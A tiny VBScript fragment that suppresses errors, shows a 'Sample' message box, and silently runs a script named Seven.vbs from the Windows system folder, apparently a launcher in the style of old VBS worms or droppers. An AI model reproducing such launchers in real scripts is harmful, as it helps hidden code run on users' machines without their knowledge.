On Error Resume Next
MsgBox "Sample"
Set w=CreateObject("WScript.Shell")
Set f=CreateObject("Scripting.FileSystemObject")
w.run f.GetSpecialFolder(0)&"\Seven.vbs"